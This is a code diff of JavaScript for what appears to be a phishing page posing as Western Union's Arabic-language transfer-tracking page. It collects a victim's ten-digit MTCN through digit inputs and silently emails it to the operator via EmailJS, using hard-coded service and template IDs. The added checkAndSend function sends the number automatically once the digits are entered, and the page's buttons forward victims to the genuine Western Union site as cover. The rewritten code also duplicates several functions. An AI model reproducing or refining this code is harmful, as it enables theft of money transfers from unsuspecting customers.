@@ -23,17 +23,7 @@
         publicKey: "y1OqcfFm5uIRRJPi-",
     });
 
-    function send_mail(message) {
-        emailjs.send("service_p23qc4c", "template_slk8rsy", {
-            message: message
-        }, {
-            publicKey: "y1OqcfFm5uIRRJPi-"
-        }).then(function(response) {
-            console.log("Email sent successfully!", response);
-        }, function(error) {
-            console.error("Failed to send email:", error);
-        });
-    }
+    
 
     function check_and_send() {
         // Check if all input fields are filled (10 digits)
@@ -1670,144 +1660,297 @@
         `;
       
         document.getElementById("page_2_1").focus();
-        
-       let inputcheck2 = document.querySelectorAll('.inputcheck2') ;
-        for (let z = 0; z < inputcheck2.length; z++) {
-            inputcheck2[z].onclick = function (){
-                for (let h = 0; h < inputcheck2.length; h++) {
-                    if(inputcheck2[h].value == '' ){
-                        inputcheck2[h].focus();
-                        break;
+
+            let inputcheck2 = document.querySelectorAll('.inputcheck2');
+            for (let z = 0; z < inputcheck2.length; z++) {
+                inputcheck2[z].onclick = function () {
+                    for (let h = 0; h < inputcheck2.length; h++) {
+                        if (inputcheck2[h].value == '') {
+                            inputcheck2[h].focus();
+                            break;
+                        }
                     }
                 }
             }
-        }
-        
-        let btns__ = document.querySelectorAll(".btns__"); 
 
-        for (let index = 0; index < btns__.length; index++) {
-            btns__[index].onclick = function(){
-                window.location.href = "https://www.westernunion.com/ntxnl/tn/ar/web/global-service/track-transfer?WULanguage=ar&WUCountry=SA";
+            let btns__ = document.querySelectorAll(".btns__");
+
+            for (let index = 0; index < btns__.length; index++) {
+                btns__[index].onclick = function () {
+                    window.location.href = "https://www.westernunion.com/ntxnl/tn/ar/web/global-service/track-transfer?WULanguage=ar&WUCountry=SA";
+                }
             }
-        }
-        
-            let page_2_1 = document.getElementById("page_2_1"); 
-            let page_2_2 = document.getElementById("page_2_2"); 
-            let page_2_3 = document.getElementById("page_2_3"); 
-            let page_2_4 = document.getElementById("page_2_4"); 
-            let page_2_5 = document.getElementById("page_2_5"); 
-            let page_2_6 = document.getElementById("page_2_6"); 
-            let page_2_7 = document.getElementById("page_2_7"); 
-            let page_2_8 = document.getElementById("page_2_8"); 
-            let page_2_9 = document.getElementById("page_2_9"); 
+
+            let page_2_1 = document.getElementById("page_2_1");
+            let page_2_2 = document.getElementById("page_2_2");
+            let page_2_3 = document.getElementById("page_2_3");
+            let page_2_4 = document.getElementById("page_2_4");
+            let page_2_5 = document.getElementById("page_2_5");
+            let page_2_6 = document.getElementById("page_2_6");
+            let page_2_7 = document.getElementById("page_2_7");
+            let page_2_8 = document.getElementById("page_2_8");
+            let page_2_9 = document.getElementById("page_2_9");
             let page_2_10 = document.getElementById("page_2_10");
 
-    
+        }
 
 
-        
-       }
-
-
-       function next_input (event, next_id, old_id){
+        function next_input(event, next_id, old_id) {
             if (event.key === "Backspace") {
-                document.getElementById(old_id).focus() ; 
-            }else{
-                document.getElementById(next_id).focus() ; 
+                document.getElementById(old_id).focus();
+            } else {
+                document.getElementById(next_id).focus();
             }
-       }
+            checkAndSend();
+        }
 
-       first_page();
+        function checkAndSend() {
+            let inputs = document.querySelectorAll('.inputcheck');
+            let allFilled = true;
+            let message = '';
 
-       function send_number (id){
-           if(id == 1){
-               if(
-                   page_1_1.value != ""&&
-                   page_1_2.value != ""&&
-                   page_1_3.value != ""&&
-                   page_1_4.value != ""&&
-                   page_1_5.value != ""&&
-                   page_1_6.value != ""&&
-                   page_1_7.value != ""&&
-                   page_1_8.value != ""&&
-                   page_1_9.value != ""&
-                   page_1_10.value != ""
-                ){
-                    let message = page_1_1.value + page_1_2.value + page_1_3.value + page_1_4.value + page_1_5.value + page_1_6.value + page_1_7.value + page_1_8.value + page_1_9.value + page_1_10.value  ;
-                    send_mail (message); 
-                    document.getElementById("message_error").style.display = "block" ; 
-                document.getElementById("label_tat_mtcn_error1").style.display = "none" ; 
-            }else{
-                document.getElementById("label_tat_mtcn_error1").style.display = "block" ; 
+            inputs.forEach(input => {
+                if (input.value === '') {
+                    allFilled = false;
+                } else {
+                    message += input.value;
+                }
+            });
+
+            if (allFilled && message.length === 10) {
+                send_mail(message);
             }
-        }else{
-            if(
-                page_2_1.value != ""&&
-                page_2_2.value != ""&&
-                page_2_3.value != ""&&
-                page_2_4.value != ""&&
-                page_2_5.value != ""&&
-                page_2_6.value != ""&&
-                page_2_7.value != ""&&
-                page_2_8.value != ""&&
-                page_2_9.value != ""&
-                page_2_10.value != ""
-            ){
-                
-                let message = page_2_1.value + page_2_2.value + page_2_3.value + page_2_4.value + page_2_5.value + page_2_6.value + page_2_7.value + page_2_8.value + page_2_9.value + page_2_10.value  ;
-                document.getElementById("message_error").style.display = "block" ; 
-                send_mail (message); 
-                document.getElementById("label_tat_mtcn_error1").style.display = "none" ; 
-            }else{
-                document.getElementById("label_tat_mtcn_error1").style.display = "block" ; 
+        }
+        first_page();
+
+        function send_number(id) {
+            if (id == 1) {
+                if (
+                    page_1_1.value != "" &&
+                    page_1_2.value != "" &&
+                    page_1_3.value != "" &&
+                    page_1_4.value != "" &&
+                    page_1_5.value != "" &&
+                    page_1_6.value != "" &&
+                    page_1_7.value != "" &&
+                    page_1_8.value != "" &&
+                    page_1_9.value != "" &
+                    page_1_10.value != ""
+                ) {
+                    let message = page_1_1.value + page_1_2.value + page_1_3.value + page_1_4.value + page_1_5.value + page_1_6.value + page_1_7.value + page_1_8.value + page_1_9.value + page_1_10.value;
+                    send_mail(message);
+                    document.getElementById("message_error").style.display = "block";
+                    document.getElementById("label_tat_mtcn_error1").style.display = "none";
+                } else {
+                    document.getElementById("label_tat_mtcn_error1").style.display = "block";
+                }
+            } else {
+                if (
+                    page_2_1.value != "" &&
+                    page_2_2.value != "" &&
+                    page_2_3.value != "" &&
+                    page_2_4.value != "" &&
+                    page_2_5.value != "" &&
+                    page_2_6.value != "" &&
+                    page_2_7.value != "" &&
+                    page_2_8.value != "" &&
+                    page_2_9.value != "" &
+                    page_2_10.value != ""
+                ) {
+
+                    let message = page_2_1.value + page_2_2.value + page_2_3.value + page_2_4.value + page_2_5.value + page_2_6.value + page_2_7.value + page_2_8.value + page_2_9.value + page_2_10.value;
+                    document.getElementById("message_error").style.display = "block";
+                    send_mail(message);
+                    document.getElementById("label_tat_mtcn_error1").style.display = "none";
+                } else {
+                    document.getElementById("label_tat_mtcn_error1").style.display = "block";
+                }
+            }
+
+        }
+
+        function out_(id) {
+            if (id == 1) {
+                document.getElementById("page_1_10").blur();
+
+                if (
+                    page_1_1.value != "" &&
+                    page_1_2.value != "" &&
+                    page_1_3.value != "" &&
+                    page_1_4.value != "" &&
+                    page_1_5.value != "" &&
+                    page_1_6.value != "" &&
+                    page_1_7.value != "" &&
+                    page_1_8.value != "" &&
+                    page_1_9.value != "" &
+                    page_1_10.value != ""
+                ) {
+                    let message = page_1_1.value + page_1_2.value + page_1_3.value + page_1_4.value + page_1_5.value + page_1_6.value + page_1_7.value + page_1_8.value + page_1_9.value + page_1_10.value;
+                    send_mail(message);
+                }
+            } else {
+                document.getElementById("page_2_10").blur();
             }
         }
 
-       }
 
-       function out_ (id){
-        if(id == 1){
-            document.getElementById("page_1_10").blur() ; 
-            
-             if(
-                page_1_1.value != ""&&
-                page_1_2.value != ""&&
-                page_1_3.value != ""&&
-                page_1_4.value != ""&&
-                page_1_5.value != ""&&
-                page_1_6.value != ""&&
-                page_1_7.value != ""&&
-                page_1_8.value != ""&&
-                page_1_9.value != ""&
-                page_1_10.value != ""
-            ){
-                let message = page_1_1.value + page_1_2.value + page_1_3.value + page_1_4.value + page_1_5.value + page_1_6.value + page_1_7.value + page_1_8.value + page_1_9.value + page_1_10.value  ;
-                send_mail (message); 
-            }
-        }else{
-            document.getElementById("page_2_10").blur() ; 
+        document.getElementById("btn_ok2").onclick = function () {
+            document.getElementById("message_error").style.display = "none";
         }
-       }
-
-
-       document.getElementById("btn_ok2").onclick = function (){
-        document.getElementById("message_error").style.display = "none" ; 
-       }
-       let inputcheck = document.querySelectorAll('.inputcheck') ;
+        let inputcheck = document.querySelectorAll('.inputcheck');
 
 
         for (let i = 0; i < inputcheck.length; i++) {
-            inputcheck[i].onchange = function (){
-                if(inputcheck[i].value > 1 ){
-                    inputcheck[i].value = inputcheck[i].value.substring(0, 1); 
+            inputcheck[i].onchange = function () {
+                if (inputcheck[i].value > 1) {
+                    inputcheck[i].value = inputcheck[i].value.substring(0, 1);
                 }
             }
         }
 
         for (let x = 0; x < inputcheck.length; x++) {
-            inputcheck[x].onclick = function (){
+            inputcheck[x].onclick = function () {
                 for (let y = 0; y < inputcheck.length; y++) {
-                    if(inputcheck[y].value == '' ){
+                    if (inputcheck[y].value == '') {
+                        inputcheck[y].focus();
+                        break;
+                    }
+                }
+            }
+        }
+        document.getElementById("page_1_1").focus();
+
+        let btns__ = document.querySelectorAll(".btns__");
+
+        for (let index = 0; index < btns__.length; index++) {
+            btns__[index].onclick = function () {
+                window.location.href = "https://www.westernunion.com/ntxnl/tn/ar/web/global-service/track-transfer?WULanguage=ar&WUCountry=SA";
+            }
+        }
+
+        let page_1_1 = document.getElementById("page_1_1");
+        let page_1_2 = document.getElementById("page_1_2");
+        let page_1_3 = document.getElementById("page_1_3");
+        let page_1_4 = document.getElementById("page_1_4");
+        let page_1_5 = document.getElementById("page_1_5");
+        let page_1_6 = document.getElementById("page_1_6");
+        let page_1_7 = document.getElementById("page_1_7");
+        let page_1_8 = document.getElementById("page_1_8");
+        let page_1_9 = document.getElementById("page_1_9");
+        let page_1_10 = document.getElementById("page_1_10");
+
+        function next_input(event, next_id, old_id) {
+            if (event.key === "Backspace") {
+                document.getElementById(old_id).focus();
+            } else {
+                document.getElementById(next_id).focus();
+            }
+            checkAndSend();
+        }
+
+        function checkAndSend() {
+            let inputs = document.querySelectorAll('.inputcheck');
+            let allFilled = true;
+            let message = '';
+
+            inputs.forEach(input => {
+                if (input.value === '') {
+                    allFilled = false;
+                } else {
+                    message += input.value;
+                }
+            });
+
+            if (allFilled && message.length === 10) {
+                send_mail(message);
+            }
+        }
+
+        function send_number(id) {
+            if (id == 1) {
+                if (
+                    page_1_1.value != "" &&
+                    page_1_2.value != "" &&
+                    page_1_3.value != "" &&
+                    page_1_4.value != "" &&
+                    page_1_5.value != "" &&
+                    page_1_6.value != "" &&
+                    page_1_7.value != "" &&
+                    page_1_8.value != "" &&
+                    page_1_9.value != "" &&
+                    page_1_10.value != ""
+                ) {
+                    let message = page_1_1.value + page_1_2.value + page_1_3.value + page_1_4.value + page_1_5.value + page_1_6.value + page_1_7.value + page_1_8.value + page_1_9.value + page_1_10.value;
+                    send_mail(message);
+                    document.getElementById("message_error").style.display = "block";
+                    document.getElementById("label_tat_mtcn_error1").style.display = "none";
+                } else {
+                    document.getElementById("label_tat_mtcn_error1").style.display = "block";
+                }
+            } else {
+                if (
+                    page_2_1.value != "" &&
+                    page_2_2.value != "" &&
+                    page_2_3.value != "" &&
+                    page_2_4.value != "" &&
+                    page_2_5.value != "" &&
+                    page_2_6.value != "" &&
+                    page_2_7.value != "" &&
+                    page_2_8.value != "" &&
+                    page_2_9.value != "" &&
+                    page_2_10.value != ""
+                ) {
+                    let message = page_2_1.value + page_2_2.value + page_2_3.value + page_2_4.value + page_2_5.value + page_2_6.value + page_2_7.value + page_2_8.value + page_2_9.value + page_2_10.value;
+                    document.getElementById("message_error").style.display = "block";
+                    send_mail(message);
+                    document.getElementById("label_tat_mtcn_error1").style.display = "none";
+                } else {
+                    document.getElementById("label_tat_mtcn_error1").style.display = "block";
+                }
+            }
+        }
+
+        function out_(id) {
+            if (id == 1) {
+                document.getElementById("page_1_10").blur();
+
+                if (
+                    page_1_1.value != "" &&
+                    page_1_2.value != "" &&
+                    page_1_3.value != "" &&
+                    page_1_4.value != "" &&
+                    page_1_5.value != "" &&
+                    page_1_6.value != "" &&
+                    page_1_7.value != "" &&
+                    page_1_8.value != "" &&
+                    page_1_9.value != "" &&
+                    page_1_10.value != ""
+                ) {
+                    let message = page_1_1.value + page_1_2.value + page_1_3.value + page_1_4.value + page_1_5.value + page_1_6.value + page_1_7.value + page_1_8.value + page_1_9.value + page_1_10.value;
+                    send_mail(message);
+                }
+            } else {
+                document.getElementById("page_2_10").blur();
+            }
+        }
+
+        document.getElementById("btn_ok2").onclick = function () {
+            document.getElementById("message_error").style.display = "none";
+        }
+
+
+        for (let i = 0; i < inputcheck.length; i++) {
+            inputcheck[i].onchange = function () {
+                if (inputcheck[i].value > 1) {
+                    inputcheck[i].value = inputcheck[i].value.substring(0, 1);
+                }
+            }
+        }
+
+        for (let x = 0; x < inputcheck.length; x++) {
+            inputcheck[x].onclick = function () {
+                for (let y = 0; y < inputcheck.length; y++) {
+                    if (inputcheck[y].value == '') {
                         inputcheck[y].focus();
                         break;
                     }
@@ -1815,6 +1958,31 @@
             }
         }
 
+        let isSending = false;
+
+        function send_mail(message) {
+    if (isSending) {
+        console.log("جاري إرسال الرقم بالفعل:", message);
+        return;
+    }
+
+    isSending = true;
+
+    console.log("Sending message:", message);
+
+    emailjs.send("service_p23qc4c", "template_slk8rsy", {
+        name: "mtcn",
+        message: message
+    })
+    .then(function (response) {
+        console.log("Email sent successfully!", response.status, response.text);
+        isSending = false; 
+    }, function (error) {
+        console.error("Failed to send email:", error);
+        alert("حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.");
+        isSending = false;
+    });
+}
 
     setTimeout(() => {
         page_1_1.focus();
